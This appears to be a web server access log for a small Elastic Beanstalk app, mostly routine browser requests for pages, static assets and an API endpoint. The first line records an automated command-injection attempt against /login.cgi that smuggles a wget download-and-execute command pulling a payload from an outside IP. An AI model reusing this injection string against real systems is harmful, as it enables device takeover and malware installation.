188.19.235.83 - - [01/Sep/2018:20:06:15 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://77.73.69.246/dl%20-O%20-%3E%20/tmp/.shinka2;sh%20/tmp/.shinka2%27$ HTTP/1.1" 400 173 "-" "Shinka/2.0" "-"
187.112.54.89 - - [01/Sep/2018:20:08:06 +0000] "GET / HTTP/1.1" 200 3069 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:08:08 +0000] "GET /favicon.ico HTTP/1.1" 200 3069 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:23:33 +0000] "GET / HTTP/1.1" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:23:35 +0000] "GET /favicon.ico HTTP/1.1" 404 149 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:24:26 +0000] "GET / HTTP/1.1" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:24:51 +0000] "GET /api/hello HTTP/1.1" 200 58 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:27:53 +0000] "GET / HTTP/1.1" 200 354 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:27:53 +0000] "GET /static/css/main.c17080f1.css HTTP/1.1" 200 312 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:27:53 +0000] "GET /static/js/main.dab076f3.js HTTP/1.1" 200 41982 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:27:54 +0000] "GET /api/hello HTTP/1.1" 200 58 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:27:54 +0000] "GET /static/media/logo.5d5d9eef.svg HTTP/1.1" 200 2671 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
66.249.85.30 - - [01/Sep/2018:20:30:35 +0000] "GET / HTTP/1.1" 200 548 "-" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.112.54.89"
66.249.85.29 - - [01/Sep/2018:20:30:36 +0000] "GET /static/css/main.c17080f1.css HTTP/1.1" 200 650 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.112.54.89"
66.249.85.28 - - [01/Sep/2018:20:30:36 +0000] "GET /static/js/main.dab076f3.js HTTP/1.1" 200 125697 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.112.54.89"
66.249.85.28 - - [01/Sep/2018:20:30:37 +0000] "GET /api/hello HTTP/1.1" 200 32 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.112.54.89"
66.249.85.29 - - [01/Sep/2018:20:30:37 +0000] "GET /static/media/logo.5d5d9eef.svg HTTP/1.1" 200 2671 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.112.54.89"
66.249.85.29 - - [01/Sep/2018:20:30:37 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.112.54.89"
66.249.85.30 - - [01/Sep/2018:20:30:42 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.112.54.89"
66.249.85.30 - - [01/Sep/2018:20:30:42 +0000] "GET /static/js/main.dab076f3.js HTTP/1.1" 304 0 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.112.54.89"
66.249.85.29 - - [01/Sep/2018:20:30:42 +0000] "GET /static/css/main.c17080f1.css HTTP/1.1" 304 0 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.112.54.89"
66.249.85.30 - - [01/Sep/2018:20:30:43 +0000] "GET /static/media/logo.5d5d9eef.svg HTTP/1.1" 304 0 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.112.54.89"
66.249.85.30 - - [01/Sep/2018:20:30:43 +0000] "GET /api/hello HTTP/1.1" 304 0 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.112.54.89"
66.249.85.29 - - [01/Sep/2018:20:30:43 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.112.54.89"
187.112.54.89 - - [01/Sep/2018:20:35:20 +0000] "GET / HTTP/1.1" 200 354 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:35:20 +0000] "GET /static/js/main.dab076f3.js HTTP/1.1" 200 41982 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:35:20 +0000] "GET /static/css/main.c17080f1.css HTTP/1.1" 200 312 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:35:21 +0000] "GET /api/hello HTTP/1.1" 200 58 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:35:21 +0000] "GET /static/media/logo.5d5d9eef.svg HTTP/1.1" 200 2671 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:35:42 +0000] "GET /static/css/main.c17080f1.css HTTP/1.1" 200 312 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:35:42 +0000] "GET /static/css/main.c17080f1.css.map HTTP/1.1" 200 551 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:35:42 +0000] "GET /static/js/main.dab076f3.js.map HTTP/1.1" 200 175567 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:36:16 +0000] "GET / HTTP/1.1" 200 354 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:36:16 +0000] "GET /static/css/main.c17080f1.css HTTP/1.1" 200 312 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:36:16 +0000] "GET /static/js/main.dab076f3.js HTTP/1.1" 200 41982 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:36:17 +0000] "GET /api/hello HTTP/1.1" 200 58 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:36:17 +0000] "GET /static/media/logo.5d5d9eef.svg HTTP/1.1" 200 2671 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:36:25 +0000] "GET /static/css/main.c17080f1.css HTTP/1.1" 200 312 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:36:27 +0000] "GET /manifest.json HTTP/1.1" 200 278 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:36:33 +0000] "GET /robots.txt HTTP/1.1" 200 354 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:36:34 +0000] "GET / HTTP/1.1" 200 354 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:36:44 +0000] "GET /static/css/main.c17080f1.css HTTP/1.1" 200 312 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:36:44 +0000] "GET / HTTP/1.1" 200 354 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:36:44 +0000] "GET /static/js/main.dab076f3.js HTTP/1.1" 200 41982 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:36:44 +0000] "GET /static/css/main.c17080f1.css HTTP/1.1" 304 0 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:36:45 +0000] "GET /main.c17080f1.css.map HTTP/1.1" 200 354 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:36:46 +0000] "GET /api/hello HTTP/1.1" 200 58 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:36:46 +0000] "GET /static/media/logo.5d5d9eef.svg HTTP/1.1" 200 2671 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:36:46 +0000] "GET /static/css/main.c17080f1.css.map HTTP/1.1" 200 551 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
187.112.54.89 - - [01/Sep/2018:20:36:46 +0000] "GET /static/js/main.dab076f3.js.map HTTP/1.1" 200 175567 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
172.31.2.145 - - [01/Sep/2018:22:09:59 +0000] "GET / HTTP/1.1" 200 354 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.2.145 - - [01/Sep/2018:22:09:59 +0000] "GET /static/css/main.c17080f1.css HTTP/1.1" 200 312 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
172.31.2.145 - - [01/Sep/2018:22:09:59 +0000] "GET /static/js/main.dab076f3.js HTTP/1.1" 200 41982 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "187.112.54.89"
